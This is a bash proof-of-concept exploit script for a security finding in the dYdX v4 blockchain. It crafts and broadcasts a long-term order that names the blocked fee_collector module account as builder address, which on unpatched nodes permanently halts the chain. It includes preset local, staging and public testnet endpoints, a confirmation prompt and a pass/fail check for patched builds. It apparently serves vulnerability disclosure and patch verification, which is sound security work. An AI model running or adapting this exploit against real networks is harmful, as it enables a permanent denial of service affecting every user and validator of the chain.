#!/bin/bash
# SEC-76 PoC: Demonstrate chain halt via blocked builder address
#
# This script reproduces Finding #85 against a live dev/staging chain.
# It places an honest maker sell, then a malicious crossing taker buy with
# fee_collector as BuilderAddress. On vulnerable code, the chain halts at the
# next PrepareCheckState. On patched code, the taker is rejected at CheckTx.
#
# Usage:
#   ./sec76_poc.sh [network] [from_account]
#
# Networks: local (default), staging, testnet
# from_account: keyring name with funded subaccount (default: alice)
#
# Prerequisites:
#   - dydxprotocold binary in PATH or ./build/
#   - Keyring with funded accounts (alice, bob) for the target network
#   - Target chain must have BTC-USD CLOB pair (clobPairId=0) with active trading
#
# WARNING: On vulnerable code, this WILL halt the chain permanently.

set -euo pipefail

NETWORK="${1:-local}"
FROM_ACCOUNT="${2:-alice}"

# BuilderAddress used in the order. Defaults to the fee_collector module
# account (a blocked address, deterministic across all dYdX v4 chains) so the
# script reproduces Finding #85's exact attack against an unpatched chain.
# Override with SEC76_BUILDER_ADDRESS=<bech32> to test a non-blocked address —
# useful for confirming a patched build still accepts legitimate builder fees.
BUILDER_ADDRESS="${SEC76_BUILDER_ADDRESS:-dydx17xpfvakm2amg962yls6f84z3kell8c5leqdyt2}"

# Network config
case "$NETWORK" in
    local)
        NODE="http://localhost:26657"
        CHAIN_ID="localdydxprotocol"
        FEES="5000000000000000adv4tnt"
        ;;
    staging)
        # Operator must supply a reachable validator RPC URL. Resolve the public
        # IP of a staging-validator ECS task and append :26657, or use the
        # internal ALB if running from inside the staging VPC.
        : "${SEC76_NODE:?SEC76_NODE must be set to a staging validator RPC URL (e.g. http://<ip>:26657)}"
        NODE="$SEC76_NODE"
        CHAIN_ID="${SEC76_CHAIN_ID:-dydxprotocol-testnet}"
        FEES="${SEC76_FEES:-200000000000adv4tnt}"
        ;;
    testnet)
        NODE="https://dydx-testnet-rpc.kingnodes.com"
        CHAIN_ID="dydx-testnet-4"
        FEES="200000000000adydx"
        ;;
    *)
        echo "Unknown network: $NETWORK (use: local, staging, testnet)"
        exit 1
        ;;
esac

# Find binary
DYDX=""
if command -v dydxprotocold &>/dev/null; then
    DYDX="dydxprotocold"
elif [ -x "./build/dydxprotocold" ]; then
    DYDX="./build/dydxprotocold"
else
    echo "Error: dydxprotocold not found in PATH or ./build/"
    exit 1
fi

echo "============================================================"
echo "SEC-76 PoC: Blocked Builder Address Chain Halt"
echo "============================================================"
echo "Network:      $NETWORK"
echo "Node:         $NODE"
echo "Chain ID:     $CHAIN_ID"
echo "From:         $FROM_ACCOUNT"
echo "Builder Addr: $BUILDER_ADDRESS"
echo "============================================================"
echo ""

# Get the from account address
FROM_ADDR=$($DYDX keys show "$FROM_ACCOUNT" -a --keyring-backend test 2>/dev/null) || {
    echo "Error: could not resolve address for key '$FROM_ACCOUNT'"
    exit 1
}
echo "Account address: $FROM_ADDR"

# Get current block height for awareness (informational only; not embedded in tx).
# Use raw RPC /status to avoid CLI grammar drift across binary versions.
CURRENT_HEIGHT=$(curl -sS --max-time 10 "$NODE/status" | python3 -c "
import sys, json
print(json.load(sys.stdin)['result']['sync_info']['latest_block_height'])
" 2>/dev/null) || {
    echo "Error: could not query current block height from $NODE"
    exit 1
}
echo "Current block height: $CURRENT_HEIGHT"

# GoodTilBlockTime: current unix time + 600s (10 minutes)
GTBT=$(( $(date +%s) + 600 ))
echo "GoodTilBlockTime: $GTBT"
echo ""

# The CLI only supports short-term orders (GoodTilBlock, OrderFlags=0).
# The actual PoC requires a long-term order (OrderFlags=64, GoodTilBlockTime).
# We construct and broadcast the raw MsgPlaceOrder JSON via `tx encode` + `tx broadcast`.

# Step 1: Create the malicious order as a JSON tx
echo "--- Step 1: Constructing malicious MsgPlaceOrder ---"
echo ""

TX_JSON=$(cat <<TXEOF
{
  "body": {
    "messages": [
      {
        "@type": "/dydxprotocol.clob.MsgPlaceOrder",
        "order": {
          "order_id": {
            "subaccount_id": {
              "owner": "$FROM_ADDR",
              "number": 0
            },
            "client_id": 99876,
            "order_flags": 64,
            "clob_pair_id": 0
          },
          "side": "SIDE_BUY",
          "quantums": "1000000",
          "subticks": "100000000000",
          "good_til_block_time": $GTBT,
          "builder_code_parameters": {
            "builder_address": "$BUILDER_ADDRESS",
            "fee_ppm": 10000
          }
        }
      }
    ],
    "memo": "SEC-76 PoC",
    "timeout_height": "0",
    "extension_options": [],
    "non_critical_extension_options": []
  },
  "auth_info": {
    "signer_infos": [],
    "fee": {
      "amount": [{"denom": "${FEES//[0-9]/}", "amount": "${FEES//[a-z]/}"}],
      "gas_limit": "200000",
      "payer": "",
      "granter": ""
    }
  },
  "signatures": []
}
TXEOF
)

# Write unsigned tx to temp file
TMPDIR=$(mktemp -d)
UNSIGNED_TX="$TMPDIR/unsigned_tx.json"
SIGNED_TX="$TMPDIR/signed_tx.json"

echo "$TX_JSON" > "$UNSIGNED_TX"
echo "Unsigned tx written to $UNSIGNED_TX"
echo ""

# Step 2: Sign the transaction (online — fetch real account_number + sequence from chain)
echo "--- Step 2: Signing transaction (online) ---"
$DYDX tx sign "$UNSIGNED_TX" \
    --from "$FROM_ACCOUNT" \
    --chain-id "$CHAIN_ID" \
    --node "$NODE" \
    --keyring-backend test \
    --output-document "$SIGNED_TX"
echo "Signed tx written to $SIGNED_TX"
echo ""

# Step 3: Broadcast
echo "--- Step 3: Broadcasting malicious order ---"
echo ""
echo "WARNING: On VULNERABLE code, this will permanently halt the chain."
echo "         On PATCHED code, this will be rejected at CheckTx."
echo ""
read -p "Proceed? (y/N) " -n 1 -r
echo ""

if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Aborted."
    rm -rf "$TMPDIR"
    exit 0
fi

RESULT=$($DYDX tx broadcast "$SIGNED_TX" \
    --node "$NODE" \
    --broadcast-mode sync \
    2>&1) || true

echo ""
echo "--- Broadcast result ---"
echo "$RESULT"
echo ""

# Check if the tx was rejected
if echo "$RESULT" | grep -qi "blocked module account\|invalid builder code\|code.*[1-9]"; then
    echo "PASS: Malicious order was REJECTED. Chain is patched."
elif echo "$RESULT" | grep -qi "code.*0\|success"; then
    echo "FAIL: Malicious order was ACCEPTED. Chain will halt at next PrepareCheckState."
    echo ""
    echo "Monitor validators for panic:"
    echo "  docker logs -f dydxprotocold0 2>&1 | grep -i panic"
else
    echo "UNKNOWN: Could not determine result. Check output above."
fi

# Cleanup
rm -rf "$TMPDIR"
